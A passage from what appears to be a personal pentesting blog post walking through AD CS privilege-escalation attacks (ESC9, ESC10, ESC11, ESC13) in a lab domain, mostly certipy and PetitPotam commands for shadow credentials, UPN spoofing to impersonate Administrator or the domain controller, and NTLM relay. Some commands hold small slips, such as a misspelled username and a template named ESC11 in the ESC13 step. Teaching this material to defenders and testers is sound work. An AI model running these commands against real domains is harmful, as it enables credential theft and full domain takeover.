<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 PetitPotam.py 192.168.1.50 192.168.1.2 -u attacker -p 'P@ssw0rd'
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/5891d28b-9a93-46a8-b0dc-26af2046010f" alt="image" /></p>

<p>Here I’ve requested a certificate as the Domain Controller machine account which can be utilized to gain control of the Domain Controller.</p>

<h3 id="exploitation-of-esc9">Exploitation of ESC9</h3>

<p>In this scenario, we’ll assume that the Domain User attacker has GenericWrite privileges on the user Jdoe.</p>

<p>First utilize shadow credentials to obtain Jdoe’s hash:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy shadow auto -username attacker@lab.lan -password 'P@ssw0rd' -account jdoe
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/8d227499-8a7e-464c-bb1c-08bd2c986120" alt="image" /></p>

<p>Next, change Jdoe’s userPrincipalName to Administrator, purposefully leaving out the Domain</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy account update -username attacker@lab.lan -password 'P@ssw0rd' -user jdoe -upn Administrator
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/ae78c583-4f91-4848-8d12-2d67fc1fac99" alt="image" /></p>

<p>Then, request a certificate as Jdoe which actually gives us a certificate as the Administrator:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -username jdoe@lab.lan -hashes e19ccf75ee54e06b06a5907af13cef42 -ca lab-CA -template ESC9 -target 192.168.1.3
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/bd95002b-2949-4d0a-b5be-e933d33eb728" alt="image" /></p>

<p>Finally, revert the UPN of Jdoe back to normal:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy account update -username attcker@lab.lan -password 'P@ssw0rd' -user jdoe -upn jdoe@lab.lan
</code></pre></div></div>

<p>Note: When utilizing the obtained certificate to authenticate as the Administrator, ensure to use the “-domain” flag, since the Domain was unspecified in the UPN</p>

<h3 id="exploitation-of-esc10">Exploitation of ESC10</h3>

<p>For the first avenue of exploitation (StrongCertificateBindingEnforcement == 0), utilize shadow credentials to gain Jdoe’s hash</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy shadow auto -username attacker@lab.lan -p P@ssw0rd -a jdoe
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/0001714a-ec6c-4c7b-90ce-3e4ca42e7596" alt="image" /></p>

<p>Then, just like in ESC9, modify Jdoe’s UPN to Administrator:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy account update -username attacker@lab.lan -password P@ssw0rd -user jdoe -upn Administrator
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/3a79b351-8b1a-4ab7-a40d-72395d02f2b7" alt="image" /></p>

<p>Next, request a certificate as Jdoe, just like in ESC9</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -ca 'lab-CA' -username jdoe@lab.lan -hashes e19ccf75ee54e06b06a5907af13cef42 -target 192.168.1.3
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/7c30561a-8cb1-49bc-86f3-2e5f2b676951" alt="image" /></p>

<p>Finally, revert Jdoe’s UPN back to normal:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy account update -username attacker@lab.lan -password P@ssw0rd -user jdoe -upn jdoe@lab.lan
</code></pre></div></div>

<p>For the second method of exploitation (CertificateMappingMethods == 0x4), also utilize shadow credentials to gain Jdoe’s hash</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy shadow auto -username attacker@lab.lan -p P@ssw0rd -account jdoe
</code></pre></div></div>
<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/0001714a-ec6c-4c7b-90ce-3e4ca42e7596" alt="image" /></p>

<p>Next, change Jdoe’s UPN to a principal that doesn’t have a UPN set, such as the Domain Controller machine account:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy account update -username attacker@lab.lan -password P@ssw0rd -user jdoe -upn 'DC$@lab.lan'
</code></pre></div></div>
<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/92e2bf79-dc36-4efe-9865-a3333db85d36" alt="image" /></p>

<p>Then, just like before, request a certificate as Jdoe:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -ca 'lab-CA' -username jdoe@lab.lan -hashes e19ccf75ee54e06b06a5907af13cef42 -target 192.168.1.3
</code></pre></div></div>
<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/ccf843ee-5967-41af-be3c-fd0931b47fd5" alt="image" /></p>

<p>Then, just like last time, revert Jdoe’s UPN back to normal:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy account update -username jdoe@lab.lan -password P@ssw0rd -user jdoe -upn 'jdoe@lab.lan'
</code></pre></div></div>

<h3 id="exploitation-of-esc11">Exploitation of ESC11</h3>

<p>Start the certipy relay server, to relay NTLM authentication requests to the vulnerable RPC endpoint:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy relay -target 'rpc://CA.lab.lan' -ca 'lab-CA' -template DomainController
</code></pre></div></div>

<p>Then coerce authentication from the Domain Controller, allowing us to request a certificate as the DC Machine account. For example, with PetitPotam:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 PetitPotam.py 192.168.1.50 192.168.1.2 -u attacker -p 'P@ssw0rd'
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/fc0f0f85-3ef6-49c2-a361-3f6247576086" alt="image" /></p>

<h3 id="exploitation-of-esc13">Exploitation of ESC13</h3>

<p>Once you’ve identified the OID group link (<a href="https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1">This</a> is a handy script for enumeration), when the certificate is requested it will inherit the permissions of the linked AD group.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -username attacker@lab.lan -password 'P@ssw0rd' -dc-ip 192.168.1.2 -target DC.lab.lan -ca 'lab-CA' -template 'ESC11'
</code></pre></div></div>

<h2 id="conclusion">Conclusion</h2>

<p>Depending on the organization, AD CS attacks can be incredibly destructive, usually leading to full Active Directory Domain privilege escalation. Because of the complexity of most Active Directory environments on enterprise networks, misconfigurations can easily be overlooked. Most ESC vulnerabilities are relatively easy to exploit and only require a few commands, while the impact to the organization if an adversary can abuse almost any ESC vulnerability is catastrophic. The most effective way to ensure attackers are unable to abuse the organizations AD CS environment is to conduct frequent audits of the Active Directory environment, utilize defense in depth, and further ensure the organization can find, remediate, and mitigate attacks in the future with a well-organized security program.</p>

      </article>

      
        <div class="blog-tags">
          <span>Tags:</span>
          
            <a href="/tags#Pentesting">Pentesting</a>
          
            <a href="/tags#Windows">Windows</a>
          
            <a href="/tags#Active Directory">Active Directory</a>
          
        </div>
      

      

      
        <!-- Check if any share-links are active -->




<section id = "social-share-section">
  <span class="sr-only">Share: </span>

  
    <a href="https://twitter.com/intent/tweet?text=Active+Directory+Certificate+Services+%28AD+CS%29+-+A+Beautifully+Vulnerable+and+Mis-configurable+Mess&url=https%3A%2F%2Flogan-goins.com%2F2024-05-04-ADCS%2F"
      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
      <span class="sr-only">Twitter</span>
    </a>
  

  

  
    <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Flogan-goins.com%2F2024-05-04-ADCS%2F"
      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
      <span class="sr-only">LinkedIn</span>
    </a>
  

  

  

</section>



      

      <ul class="pagination blog-pager">
        
        <li class="page-item previous">
          <a class="page-link" href="/2024-03-17-Manager/" data-toggle="tooltip" data-placement="top" title="Manager">&larr; Previous Post</a>
        </li>
        
        
        <li class="page-item next">
          <a class="page-link" href="/2024-06-23-reflection/" data-toggle="tooltip" data-placement="top" title="Reflection">Next Post &rarr;</a>
        </li>
        
      </ul>
      
  
  
  

  


  



    </div>
  </div>
</div>


  <footer>
  <div class="container-md beautiful-jekyll-footer">
    <div class="row">
      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
    <a href="https://github.com/shellph1sh" title="GitHub">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">GitHub</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://twitter.com/shellph1sh" title="Twitter">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">Twitter</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://linkedin.com/in/logan-goins" title="LinkedIn">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">LinkedIn</span>
   </a>
  </li></ul>

      
      <p class="copyright text-muted">
      
        Logan Goins
        &nbsp;&bull;&nbsp;
      
      2024

      
        &nbsp;&bull;&nbsp;
        <span class="author-site">
          <a href="https://logan-goins.com/">logan-goins</a>
        </span>
      

      
      </p>
      <p class="theme-by text-muted">
        Powered by
        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
      </p>
      </div>
    </div>
  </div>
</footer>


  
  
    
  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>


  
    
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>


  
    
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>


  



  
    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
    
      <script src="/assets/js/beautifuljekyll.js"></script>
    
  









</body>
</html>
